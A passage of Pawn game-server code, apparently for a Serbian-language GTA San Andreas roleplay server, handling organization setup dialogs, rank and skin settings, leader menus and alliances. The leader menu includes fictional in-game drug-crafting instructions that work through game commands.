	   		OI[ id ][ oInt ] = intid;
	   		OI[ id ][ oVw ] = id;
	       	SaveOrganization( id );
		    SPD( playerid, dialog_ORGTIP, DSL, D_NASLOV, "Tip: PD/FBI/CIA\nTip: Banda\nTip: Mafija\nTip: Bajkeri\nTip: Raceri\nTip: Bolnicari\nTip: Novinari\nTip: Hitmani\nTip: Elektricari\nTip: Taksisti", D_ODABERI, D_ODUSTANI ); }
	}
	else if( dialogid == dialog_ORGTIP && response) {
	    new id = GetNearestOrganization( playerid );
	    if( OrgKreiranje[ playerid ] == 0 ) {
			if(listitem ==  0) {
				OI[ id ][ oTip ] = ORG_TIP_PD;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : PD/FBI/CIA" ); }
			if(listitem ==  1) {
				OI[ id][ oTip ] = ORG_TIP_BANDA;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : Banda" ); }
			if(listitem ==  2) {
				OI[ id ][ oTip ] = ORG_TIP_MAFIJA;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : Mafija" ); }
            if(listitem ==  3) {
				OI[ id ][ oTip ] = ORG_TIP_MC;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : Bajkeri" ); }
	        if(listitem ==  4) {
				OI[ id ][ oTip ] = ORG_TIP_SR;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : Street Raceri" ); }
            if(listitem ==  5) {
				OI[ id ][ oTip ] = ORG_TIP_MD;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : Bolnicari" ); }
            if(listitem ==  6) {
				OI[ id ][ oTip ] = ORG_TIP_CNN;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : Novinari" ); }
	        if(listitem == 7 ) {
				OI[ id ][ oTip ] = ORG_TIP_HITM;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : Hitmani" ); }
	        if( listitem == 8 ) {
				OI[ id ][ oTip ] = ORG_TIP_ELEK;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : Elektricar" );
			}
			if( listitem == 9 ) {
				OI[ id ][ oTip ] = ORG_TIP_TAXI;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : Taksisti" );
			}
		}
		else {
		    if(listitem ==  0) {
				OI[ id ][ oTip ] = ORG_TIP_PD;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : PD/FBI/CIA" ); }
			if(listitem ==  1) {
				OI[ id][ oTip ] = ORG_TIP_BANDA;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : Banda" ); }
			if(listitem ==  2) {
				OI[ id ][ oTip ] = ORG_TIP_MAFIJA;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : Mafija" ); }
            if(listitem ==  3) {
				OI[ id ][ oTip ] = ORG_TIP_MC;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : Bajkeri" ); }
	        if(listitem ==  4) {
				OI[ id ][ oTip ] = ORG_TIP_SR;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : Street Raceri" ); }
            if(listitem ==  5) {
				OI[ id ][ oTip ] = ORG_TIP_MD;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : Bolnicari" ); }
            if(listitem ==  6) {
				OI[ id ][ oTip ] = ORG_TIP_CNN;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : Novinari" ); }
            if(listitem ==  7) {
				OI[ id ][ oTip ] = ORG_TIP_HITM;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : Hitmani" ); }
            if( listitem ==  8 ) {
				OI[ id ][ oTip ] = ORG_TIP_ELEK;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : Elektricar" );
			}
			if( listitem == 9 ) {
				OI[ id ][ oTip ] = ORG_TIP_TAXI;
	        	SaveOrganization( id );
	        	SendInfoMessage( playerid, "Tip : Taksisti" );
			}
			
			SPD( playerid, dialog_ORGRANK1, DSI, D_NASLOV, "U prazni prostor ispod unesite ime za rank 1 ove organizacije.", D_ODABERI, D_ODUSTANI );
		}
		return 1;
	}
	else if( dialogid == dialog_ORGRANK1 ) {
	    new id = GetNearestOrganization( playerid );
		new ime[ORG_RANK];
		if(sscanf(inputtext, "s[64]", ime)) return SPD( playerid, dialog_ORGRANK1, DSI, D_NASLOV, "U prazni prostor ispod unesite ime za rank 1 ove organizacije.", D_ODABERI, D_ODUSTANI );
        if( OrgKreiranje[ playerid ] == 0 ) {
			strmid( OI[ id ][ oRank1 ], ime, 0, strlen(ime), ORG_RANK);
			SaveOrganization(id);
			SendInfoMessage( playerid, "Postavili ste ime ranka na %s", OI[ id ][ oRank1 ] ); }
		else {
		    strmid( OI[ id ][ oRank1 ], ime, 0, strlen(ime), ORG_RANK);
			SaveOrganization(id);
			SendInfoMessage( playerid, "Postavili ste ime ranka na %s", OI[ id ][ oRank1 ] );
			SPD( playerid, dialog_ORGRANK2, DSI, D_NASLOV, "U prazni prostor ispod unesite ime za rank 2 ove organizacije.", D_ODABERI, D_ODUSTANI ); }
	}
	else if( dialogid == dialog_ORGRANK2) {
	    new id = GetNearestOrganization( playerid );
		new ime[ORG_RANK];
		if(sscanf(inputtext, "s[64]", ime)) return SPD( playerid, dialog_ORGRANK2, DSI, D_NASLOV, "U prazni prostor ispod unesite ime za rank 2 ove organizacije.", D_ODABERI, D_ODUSTANI );
        if( OrgKreiranje[ playerid ] == 0 ) {
			strmid( OI[ id ][ oRank2 ], ime, 0, strlen(ime), ORG_RANK);
			SaveOrganization(id);
			SendInfoMessage( playerid, "Postavili ste ime ranka na %s", OI[ id ][ oRank2 ] ); }
		else {
			strmid( OI[ id ][ oRank2 ], ime, 0, strlen(ime), ORG_RANK);
			SaveOrganization(id);
			SendInfoMessage( playerid, "Postavili ste ime ranka na %s", OI[ id ][ oRank2 ] );
			SPD( playerid, dialog_ORGRANK3, DSI, D_NASLOV, "U prazni prostor ispod unesite ime za rank 3 ove organizacije.", D_ODABERI, D_ODUSTANI); }
	}
	else if( dialogid == dialog_ORGRANK3) {
	    new id = GetNearestOrganization( playerid );
		new ime[ORG_RANK];
		if(sscanf(inputtext, "s[64]", ime)) return SPD( playerid, dialog_ORGRANK3, DSI, D_NASLOV, "U prazni prostor ispod unesite ime za rank 3 ove organizacije.", D_ODABERI, D_ODUSTANI );
        if( OrgKreiranje[ playerid ] == 0 ) {
            strmid(OI[ id ][ oRank3 ], ime, 0, strlen(ime), ORG_RANK);
			SaveOrganization(id);
			SendInfoMessage( playerid, "Postavili ste ime ranka na %s", OI[ id ][ oRank3 ] ); }
		else {
			strmid(OI[ id ][ oRank3 ], ime, 0, strlen(ime), ORG_RANK);
			SaveOrganization(id);
			SendInfoMessage( playerid, "Postavili ste ime ranka na %s", OI[ id ][ oRank3 ] );
			SPD( playerid, dialog_ORGRANK4, DSI, D_NASLOV, "U prazni prostor ispod unesite ime za rank 4 ove organizacije.", D_ODABERI, D_ODUSTANI ); }
	}
	else if( dialogid == dialog_ORGRANK4) {
	    new id = GetNearestOrganization( playerid );
		new ime[ORG_RANK];
		if(sscanf(inputtext, "s[64]", ime)) return SPD( playerid, dialog_ORGRANK4, DSI, D_NASLOV, "U prazni prostor ispod unesite ime za rank 4 ove organizacije.", D_ODABERI, D_ODUSTANI );
        if( OrgKreiranje[ playerid ] == 0 ) {
            strmid( OI[ id][ oRank4 ], ime, 0, strlen(ime), ORG_RANK);
			SaveOrganization(id);
			SendInfoMessage( playerid, "Postavili ste ime ranka na %s", OI[ id ][ oRank4 ] ); }
		else {
			strmid( OI[ id][ oRank4 ], ime, 0, strlen(ime), ORG_RANK);
			SaveOrganization(id);
			SendInfoMessage( playerid, "Postavili ste ime ranka na %s", OI[ id ][ oRank4 ] );
			SPD( playerid, dialog_ORGRANK5, DSI, D_NASLOV, "U prazni prostor ispod unesite ime za rank 5 ove organizacije.", D_ODABERI, D_ODUSTANI ); }
	}
	else if( dialogid == dialog_ORGRANK5) {
	    new id = GetNearestOrganization( playerid );
		new ime[ORG_RANK];
		if(sscanf(inputtext, "s[64]", ime)) return SPD( playerid, dialog_ORGRANK5, DSI, D_NASLOV, "U prazni prostor ispod unesite ime za rank 5 ove organizacije.", D_ODABERI, D_ODUSTANI );
        if( OrgKreiranje[ playerid ] == 0 ) {
        	strmid( OI[ id ][ oRank5 ], ime, 0, strlen(ime), ORG_RANK);
			SaveOrganization(id);
			SendInfoMessage( playerid, "Postavili ste ime ranka na %s", OI[ id ][ oRank5 ] ); }
		else {
			strmid( OI[ id ][ oRank5 ], ime, 0, strlen(ime), ORG_RANK);
			SaveOrganization(id);
			SendInfoMessage( playerid, "Postavili ste ime ranka na %s", OI[ id ][ oRank5 ] );
			SPD( playerid, dialog_ORGRANK6, DSI, D_NASLOV, "U prazni prostor ispod unesite ime za rank 6 ove organizacije.", D_ODABERI, D_ODUSTANI ); }
	}
	else if( dialogid == dialog_ORGRANK6) {
	    new id = GetNearestOrganization( playerid );
		new ime[ORG_RANK];
		if( sscanf( inputtext, "s[64]", ime ) ) return SPD( playerid, dialog_ORGRANK6, DSI, D_NASLOV, "U prazni prostor ispod unesite ime za rank 6 ove organizacije.", D_ODABERI, D_ODUSTANI );
		strmid( OI[ id ][ oRank6 ], ime, 0, strlen(ime), ORG_RANK);
		SaveOrganization( id );
		SendInfoMessage( playerid, "Postavili ste ime ranka na %s", OI[ id ][ oRank6 ] );
		SPD( playerid, dialog_ORGSKINS, DSI, D_NASLOV, "Unesite id-ove muskih skinova za rankove koje zelite:\n Mora biti 6 id-a(rank1-6)\nPrimer: 1 2 3 4 5 6", D_ODABERI, D_ODUSTANI );
	}
	else if( dialogid == dialog_ORGSKINS && response ) {
	    new id = GetNearestOrganization(playerid);
	    new rank1, rank2, rank3, rank4, rank5, rank6;
	    if(sscanf(inputtext, "iiiiii", rank1, rank2, rank3, rank4, rank5, rank6)) return SPD( playerid, dialog_ORGSKINS, DSI, D_NASLOV, "Unesite id-ove muskih skinova za rankove koje zelite:\n Mora biti 6 id-a(rank1-6)\nPrimer: 1 2 3 4 5 6", D_ODABERI, D_ODUSTANI );
        if( OrgKreiranje[ playerid ] == 0 ) {
            OI[ id ][ oSkin1 ] = rank1;
		    OI[ id ][ oSkin2 ] = rank2;
		    OI[ id ][ oSkin3 ] = rank3;
		    OI[ id ][ oSkin4 ] = rank4;
		    OI[ id ][ oSkin5 ] = rank5;
		    OI[ id ][ oSkin6 ] = rank6;
		    SaveOrganization( id );
			SendInfoMessage( playerid, "Uspesno ste promenili id-ove muskih skinova za rankove!" );
		}
        else {
			OI[ id ][ oSkin1 ] = rank1;
		    OI[ id ][ oSkin2 ] = rank2;
		    OI[ id ][ oSkin3 ] = rank3;
		    OI[ id ][ oSkin4 ] = rank4;
		    OI[ id ][ oSkin5 ] = rank5;
		    OI[ id ][ oSkin6 ] = rank6;
		    SaveOrganization( id );
		    SendInfoMessage( playerid, "Uspesno ste postavili id-ove muskih skinova za rankove!" );
		    SPD( playerid, dialog_ORGZSKINS, DSI, D_NASLOV, "Unesite id-ove zenskih skinova za rankove koje zelite:\n Mora biti 6 id-a(rank1-6)\nPrimer: 1 2 3 4 5 6", D_ODABERI, D_ODUSTANI );
		}
	}
	else if( dialogid == dialog_ORGZSKINS && response ) {
	    new id = GetNearestOrganization(playerid);
	    new rank1, rank2, rank3, rank4, rank5, rank6;
	    if(sscanf(inputtext, "iiiiii", rank1, rank2, rank3, rank4, rank5, rank6)) return SPD( playerid, dialog_ORGZSKINS, DSI, D_NASLOV, "Unesite id-ove zenskih skinova za rankove koje zelite:\n Mora biti 6 id-a(rank1-6)\nPrimer: 1 2 3 4 5 6", D_ODABERI, D_ODUSTANI );
        if( OrgKreiranje[ playerid ] == 0 ) {
            OI[ id ][ oZSkin1 ] = rank1;
		    OI[ id ][ oZSkin2 ] = rank2;
		    OI[ id ][ oZSkin3 ] = rank3;
		    OI[ id ][ oZSkin4 ] = rank4;
		    OI[ id ][ oZSkin5 ] = rank5;
		    OI[ id ][ oZSkin6 ] = rank6;
		    SaveOrganization( id );
			SendInfoMessage( playerid, "Uspesno ste promenili id-ove zenskih skinova za rankove!" );
		}
        else {
			OI[ id ][ oZSkin1 ] = rank1;
		    OI[ id ][ oZSkin2 ] = rank2;
		    OI[ id ][ oZSkin3 ] = rank3;
		    OI[ id ][ oZSkin4 ] = rank4;
		    OI[ id ][ oZSkin5 ] = rank5;
		    OI[ id ][ oZSkin6 ] = rank6;
		    SPD( playerid, dialog_ORGMAXMEMB, DSI, D_NASLOV, "Unesti broj koliko ova orga moze imati maksimalno clanova(8-30)", D_ODABERI, D_ODUSTANI );
		    SaveOrganization( id );
		    SendInfoMessage( playerid, "Uspesno ste postavili id-ove zenskih skinova za rankove!" );
		}
	}
	else if( dialogid == dialog_ORGMAXMEMB && response ) {
	    new id = GetNearestOrganization( playerid ), maxmemb;
	    if( sscanf( inputtext, "i", maxmemb ) ) return SPD( playerid, dialog_ORGMAXMEMB, DSI, D_NASLOV, "Unesti broj koliko ova orga moze imati maksimalno clanova(8-30)", D_ODABERI, D_ODUSTANI );
		if( maxmemb < 8 || maxmemb > 30 ) return SPD( playerid, dialog_ORGMAXMEMB, DSI, D_NASLOV, "Unesti broj koliko ova orga moze imati maksimalno clanova(8-30)", D_ODABERI, D_ODUSTANI );
		OI[ id ][ oMaxClanova ] = maxmemb;
        SaveOrganization( id );
        SendInfoMessage( playerid, "Uspesno ste postavili broj maksimalno clanova na %d!", maxmemb );
        SendInfoMessage( playerid, "Uspesno ste zavrsili kreiranje organizacija." );
        OrgKreiranje[ playerid ] = 0;
	}
	else if( dialogid == dialog_ORGDRUGCHOSE && response ) {
	    new id = GetNearestOrganization( playerid );
	    switch( listitem ) {
	 		case 0: {
	 		    OI[ id ][ oControlType ] = CTIP_HEROIN;
	 		    SendInfoMessage( playerid, "Postavili da ova mafija upravlja Heroinom." );
	 		}
	 		case 1: {
	 		    OI[ id ][ oControlType ] = CTIP_KOKAIN;
	 		    SendInfoMessage( playerid, "Postavili da ova mafija upravlja Kokainom." );
	 		    SendInfoMessage( playerid, "Postavili da ova banda upravlja Marihuanom." );
	 		    SendInfoMessage( playerid, "Sada trebas sacuvati poziciju poljanje gde ce moci da se sadi droga." );
                SendInfoMessage( playerid, "Odi na zeljeno mesto i kucaj /orgpolje." );
                PoljeDroge[ playerid ] = id;
	 		}
	 		case 2: {
	 		    OI[ id ][ oControlType ] = CTIP_BMETH;
	 		    SendInfoMessage( playerid, "Postavili da ova mafija upravlja Plavi Methamphetaminom." );
	 		}
		}
		SaveOrganization( id );
	}
	else if( dialogid == dialog_ORGDRUGCHOSE_2 && response ) {
	    new id = GetNearestOrganization( playerid );
	    switch( listitem ) {
	 		case 0: {
	 		    OI[ id ][ oControlType ] = CTIP_MARIHUANA;
	 		    SendInfoMessage( playerid, "Postavili da ova banda upravlja Marihuanom." );
	 		    SendInfoMessage( playerid, "Sada trebas sacuvati poziciju poljanje gde ce moci da se sadi droga." );
                SendInfoMessage( playerid, "Odi na zeljeno mesto i kucaj /orgpolje." );
                PoljeDroge[ playerid ] = id;
			}
	 		case 1: {
	 		    OI[ id ][ oControlType ] = CTIP_CRACK;
	 		    SendInfoMessage( playerid, "Postavili da ova banda upravlja Crackom." );
	 		}
	 		case 2: {
	 		    OI[ id ][ oControlType ] = CTIP_METH;
	 		    SendInfoMessage( playerid, "Postavili da ova banda upravlja Methamphetaminom." );
	 		}
		}
		SaveOrganization( id );
	}
	else if( dialogid == dialog_LIDER && response ) {
		switch( listitem ) {
		    case 0: {
		        new OrgID = PlayerInfo[ playerid ][ xLider ];
		    
                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
                
                new string[ 128 ];
	         	format( string, sizeof( string ), ""col_crvena"Broj ubacenih clanova: "col_white"%d/30\n", OI[ OrgID ][ oUbacenihClanova ] );
                strcat( DialogStrgEx, string );
                
                if( GetFactionType( playerid ) == ORG_TIP_BANDA ) {
                    strcat( DialogStrgEx, "Za svaku teritoriju vasa banda dobija po 500 dolara svakog punog sata.\n" );
                }
                
                if( OI[ OrgID ][ oControlType ] == CTIP_HEROIN ) {
                    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
                    
					strcat( DialogStrgEx, ""col_crvena"Droga koju kontrolisete: "col_white"Heroin\n\n");
					
					strcat( DialogStrgEx, ""col_crvena"UPUSTVO "col_white"za pravljenje\n");
					strcat( DialogStrgEx, ""col_white"1. "col_crvena"Morate kupiti opim kod dokova "col_white"'/droga buyilegal'\n");
					strcat( DialogStrgEx, ""col_white"2. "col_crvena"Morate da kupite kalcijum u apoteci "col_white"'/pharmacy'\n");
					strcat( DialogStrgEx, ""col_white"3. "col_crvena"Morate da kupite amonijum hlorid u apoteci "col_white"'/pharmacy'\n");
					strcat( DialogStrgEx, ""col_white"4. "col_crvena"Morate da napravite drogu u interieru "col_white"'/droga napravi'\n");
					strcat( DialogStrgEx, ""col_white"5. "col_crvena"Morate uneti dobro formulu zbog kvaliteta'\n");
					strcat( DialogStrgEx, ""col_white"6. "col_crvena"Heroin se pravi u velikim kolicinama'\n");
                }
                else if( OI[ OrgID ][ oControlType ] == CTIP_KOKAIN ) {
                    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");

                    strcat( DialogStrgEx, ""col_crvena"Droga koju kontrolisete: "col_white"Kokain\n\n");

					strcat( DialogStrgEx, ""col_crvena"UPUSTVO "col_white"za pravljenje\n");
					strcat( DialogStrgEx, ""col_white"1. "col_crvena"Morate da posadite i oberete drogu, zatim da je osusite\n");
					strcat( DialogStrgEx, ""col_white"2. "col_crvena"Morate da kupite sodu bikarbonu u marketu "col_white"'/buy'\n");
					strcat( DialogStrgEx, ""col_white"3. "col_crvena"Morate da kupite destilovanu vodu u marketu "col_white"'/buy'\n");
					strcat( DialogStrgEx, ""col_white"4. "col_crvena"Morate imati osuseni kokain kod sebe\n");
					strcat( DialogStrgEx, ""col_white"5. "col_crvena"Morate da napravite drogu u interieru "col_white"'/droga napravi'\n");
					strcat( DialogStrgEx, ""col_white"6. "col_crvena"Moras uneti dobro formulu zbog kvaliteta'\n");
					strcat( DialogStrgEx, ""col_white"7. "col_crvena"Kokain se pravi u manjim kolicinama'\n");
                }
                else if( OI[ OrgID ][ oControlType ] == CTIP_BMETH ) {
                    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");

                    strcat( DialogStrgEx, ""col_crvena"Droga koju kontrolisete: "col_white"Blue Methamphetamine\n\n");

					strcat( DialogStrgEx, ""col_crvena"UPUSTVO "col_white"za pravljenje\n");
					strcat( DialogStrgEx, ""col_white"1. "col_crvena"Morate kupiti methylamin kod dokova "col_white"'/droga buyilegal'\n");
					strcat( DialogStrgEx, ""col_white"2. "col_crvena"Morate da kupiti solnu kiselinu u apoteci "col_white"'/pharmacy'\n");
					strcat( DialogStrgEx, ""col_white"3. "col_crvena"Morate da kupite crveni fosfor u apoteci "col_white"'/pharmacy'\n");
					strcat( DialogStrgEx, ""col_white"4. "col_crvena"Morate da kupite sodu bikarbonu u marketu "col_white"'/buy'\n");
					strcat( DialogStrgEx, ""col_white"5. "col_crvena"Morate da napravite drogu u interieru "col_white"'/droga napravi'\n");
					strcat( DialogStrgEx, ""col_white"6. "col_crvena"Moras uneti dobro formulu zbog kvaliteta'\n");
					strcat( DialogStrgEx, ""col_white"7. "col_crvena"Blue Methamphetamine se pravi u manjim kolicinama'\n");
                }
                else if( OI[ OrgID ][ oControlType ] == CTIP_MARIHUANA ) {
                    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
                
                    strcat( DialogStrgEx, ""col_crvena"Droga koju kontrolisete: "col_white"Marihuana\n\n");

					strcat( DialogStrgEx, ""col_crvena"UPUSTVO "col_white"za pravljenje\n");
					strcat( DialogStrgEx, ""col_white"1. "col_crvena"Morate kupiti seme "col_white"'/droga buyseeds'\n");
					strcat( DialogStrgEx, ""col_white"2. "col_crvena"Morate da posadite seme "col_white"'/droga posadi'\n");
					strcat( DialogStrgEx, ""col_white"3. "col_crvena"Morate da oberete stabiljku "col_white"'/droga oberi'\n");
					strcat( DialogStrgEx, ""col_white"4. "col_crvena"Morate da osusite stabiljku "col_white"'/droga osusi'\n");
                }
				else if( OI[ OrgID ][ oControlType ] == CTIP_CRACK ) {
                    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");

				    strcat( DialogStrgEx, ""col_crvena"Droga koju kontrolisete: "col_white"Crack\n\n");
				    
				    strcat( DialogStrgEx, ""col_crvena"UPUSTVO "col_white"za pravljenje\n");
				    strcat( DialogStrgEx, ""col_white"1. "col_crvena"Morate da kupite sodu bikarbonu u marketu "col_white"'/buy'\n");
					strcat( DialogStrgEx, ""col_white"2. "col_crvena"Morate da kupite destilovanu vodu u marketu "col_white"'/buy'\n");
					strcat( DialogStrgEx, ""col_white"3. "col_crvena"Morate imati gotov kokain kod sebe\n");
					strcat( DialogStrgEx, ""col_white"4. "col_crvena"Morate da napravite drogu u interieru "col_white"'/droga napravi'\n");
					strcat( DialogStrgEx, ""col_white"5. "col_crvena"Moras uneti dobro formulu zbog kvaliteta'\n");
					strcat( DialogStrgEx, ""col_white"6. "col_crvena"Crack se pravi u manjim kolicinama'\n");
                }
                else if( OI[ OrgID ][ oControlType ] == CTIP_METH ) {
                    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");

                    strcat( DialogStrgEx, ""col_crvena"Droga koju kontrolisete: "col_white"Methamphetamine\n\n");

					strcat( DialogStrgEx, ""col_crvena"UPUSTVO "col_white"za pravljenje\n");
					strcat( DialogStrgEx, ""col_white"1. "col_crvena"Morate da kupiti pseudo u apoteci "col_white"'/pharmacy'\n");
					strcat( DialogStrgEx, ""col_white"2. "col_crvena"Morate da kupiti solnu kiselinu u apoteci "col_white"'/pharmacy'\n");
					strcat( DialogStrgEx, ""col_white"3. "col_crvena"Morate da kupite crveni fosfor u apoteci "col_white"'/pharmacy'\n");
					strcat( DialogStrgEx, ""col_white"4. "col_crvena"Morate da kupite sodu bikarbonu u marketu "col_white"'/buy'\n");
					strcat( DialogStrgEx, ""col_white"5. "col_crvena"Morate da napravite drogu u interieru "col_white"'/droga napravi'\n");
					strcat( DialogStrgEx, ""col_white"6. "col_crvena"Moras uneti dobro formulu zbog kvaliteta'\n");
					strcat( DialogStrgEx, ""col_white"7. "col_crvena"Methamphetamine se pravi u manjim kolicinama'\n");
                }

				ShowPlayerDialog( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "U redu", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
		    }
	 		case 1: {
	 			SPD( playerid, dialog_UBACIUORG, DSI, D_NASLOV, "Unesite id igraca kojeg zelite pozvati u vasu organizaciju", D_ODABERI, D_ODUSTANI); }
	 		case 2: {
	 			SPD( playerid, dialog_IZBACIIZORG, DSI, D_NASLOV, "Unesite id igraca kojeg zelite izbaciti iz vase organizacije", D_ODABERI, D_ODUSTANI); }
			case 3: {
	 			SPD( playerid, dialog_OFFIZBACIIZORG, DSI, D_NASLOV, "Unesite ime i prezime(Ime_Prezime) igraca kojeg zelite izbaciti iz vase organizacije", D_ODABERI, D_ODUSTANI); }
            case 4: {
                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
                new OrgID = PlayerInfo[ playerid ][ xLider ];
	 		    format( DialogStrgEx, sizeof( DialogStrgEx ), "Lider 1: %s\nLider 2: %s\nClan 1: %s\nClan 2: %s\nClan 3: %s\nClan 4: %s\nClan 5: %s\nClan 6: %s\nClan 7: %s\nClan 8: %s\nClan 9: %s\nClan 10: %s\nClan 11: %s\nClan 12: %s\nClan 13: %s\nClan 14: %s\nClan 15: %s\nClan 16: %s\nClan 17: %s\nClan 18: %s\nClan 19: %s\nClan 20: %s\nClan 21: %s\nClan 22: %s\nClan 23: %s\nClan 24: %s\nClan 25: %s\nClan 26: %s\nClan 27: %s\nClan 28: %s\nClan 29: %s\nClan 30: %s" ,
				 	OI[ OrgID ][ oLider1 ],
				 	OI[ OrgID ][ oLider2 ],
			 		OI[ OrgID ][ oClan1 ],
					OI[ OrgID ][ oClan2 ],
				 	OI[ OrgID ][ oClan3 ],
				 	OI[ OrgID ][ oClan4 ],
					OI[ OrgID ][ oClan5 ],
					OI[ OrgID ][ oClan6 ],
					OI[ OrgID ][ oClan7 ],
					OI[ OrgID ][ oClan8 ],
					OI[ OrgID ][ oClan9 ],
					OI[ OrgID ][ oClan10 ],
					OI[ OrgID ][ oClan11 ],
					OI[ OrgID ][ oClan12 ],
					OI[ OrgID ][ oClan13 ],
					OI[ OrgID ][ oClan14 ],
					OI[ OrgID ][ oClan15 ],
					OI[ OrgID ][ oClan16 ],
					OI[ OrgID ][ oClan17 ],
					OI[ OrgID ][ oClan18 ],
					OI[ OrgID ][ oClan19 ],
					OI[ OrgID ][ oClan20 ],
					OI[ OrgID ][ oClan21 ],
					OI[ OrgID ][ oClan22 ],
					OI[ OrgID ][ oClan23 ],
					OI[ OrgID ][ oClan24 ],
					OI[ OrgID ][ oClan25 ],
					OI[ OrgID ][ oClan26 ],
					OI[ OrgID ][ oClan27 ],
					OI[ OrgID ][ oClan28 ],
					OI[ OrgID ][ oClan29 ],
					OI[ OrgID ][ oClan30 ] );
				ShowPlayerDialog( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "U redu", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
            }
			case 5: {
			    if( GetFactionType( playerid ) == ORG_TIP_PD && GetFactionType( playerid ) == ORG_TIP_MD && GetFactionType( playerid ) == ORG_TIP_CNN && GetFactionType( playerid ) == ORG_TIP_HITM && GetFactionType( playerid ) == ORG_TIP_ELEK && GetFactionType( playerid ) == ORG_TIP_TAXI ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju." );
			    SendInfoMessage(playerid, "Koristi /war");
			}
            case 6: {
                SPD( playerid, dialog_LIDER_2, DSL, D_NASLOV, "Lokacija mesta za sadjenje\nLokacija nabavke opiuma\nLokacija nabavke metilamina\nLokacija nabavke semena", D_ODABERI, D_ODUSTANI );
            }
            case 7: {

                for(new i; i< sizeof(OrgVehInfo); i++)
                {
                    if(IsPlayerInRangeOfPoint(playerid, 3.0, OrgVehInfo[i][oVehPosX], OrgVehInfo[i][oVehPosY], OrgVehInfo[i][oVehPosZ]))
                    {
                        if(OrgVehInfo[i][oVehOrgID] == PlayerInfo[playerid][xLider]) {

                            new VehString[2048];
                            new string[64];

                            format(string, sizeof(string), ""SRVBOJA1SCM"1) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[i][oVehModel1] - 400], OrgVehInfo[i][oVehKolicina1]);
                            strcat(VehString, string);
                            format(string, sizeof(string), ""SRVBOJA1SCM"2) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[i][oVehModel2] - 400], OrgVehInfo[i][oVehKolicina2]);
                            strcat(VehString, string);
                            format(string, sizeof(string), ""SRVBOJA1SCM"3) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[i][oVehModel3] - 400], OrgVehInfo[i][oVehKolicina3]);
                            strcat(VehString, string);
                            format(string, sizeof(string), ""SRVBOJA1SCM"4) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[i][oVehModel4] - 400], OrgVehInfo[i][oVehKolicina4]);
                            strcat(VehString, string);
                            format(string, sizeof(string), ""SRVBOJA1SCM"5) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[i][oVehModel5] - 400], OrgVehInfo[i][oVehKolicina5]);
                            strcat(VehString, string);

                            ShowPlayerDialog(playerid, dialog_OrgVoziloUpgrade, DIALOG_STYLE_LIST, "Odaberi vozilo za nadogradnju", VehString, "Potvrdi", "Odustani");
                            return 1;

                        }
                    }
                }

                return 1;
            }
            case 8: {

                ShowPlayerDialog(playerid, dialog_Savez, DIALOG_STYLE_INPUT, "Savez", "Unesite ID organizacije sa kojom zelite savez\nKoristite ID 0 da prekinete trenutni savez", "Ponudi savez", "Odustani");

                return 1;
            }
            case 9: {

                SPD( playerid, dialog_DODELIRANK, DSI, D_NASLOV, "Unesite id igraca i broj ranka koji zelite da date igracu", D_ODABERI, D_ODUSTANI);

                return 1;
            }
		}
	}
    else if(dialogid == dialog_Savez && response) {

        new orgID;
        new org = PlayerInfo[playerid][xLider];
        if(sscanf(inputtext, "d", orgID)) return ShowPlayerDialog(playerid, dialog_Savez, DIALOG_STYLE_INPUT, "Savez", "Unesite ID organizacije sa kojom zelite savez\nKoristite ID 0 da prekinete trenutni savez", "Ponudi savez", "Odustani");

        if(orgID == 0) {

            if(OI[org][oSavez] == 0) return SendErrorMessage(playerid, "Nisi u savezu!");
            //if(OI[orgID][oSavez] != org) return SendErrorMessage(playerid, "Ova organizacija nije u savezu sa vama!");

            OI[org][oSavez] = 0;
            OI[orgID][oSavez] = 0;
            SaveOrganization(org);
            SaveOrganization(orgID);

            new string[128];
            format(string, sizeof(string), "Organizacija %s je raskinula savez sa vama!", OI[org][oName]);
            OrgPoruka( orgID, ZUTA, string);

            format(string, sizeof(string), "Raskinuli ste savez sa organizacijom %s!", OI[orgID][oName]);
            OrgPoruka(org, ZUTA, string);

            return 1;
        }
        else {

            new org_file[ 40 ];
            format (org_file, sizeof( org_file ), O_FILE, orgID );
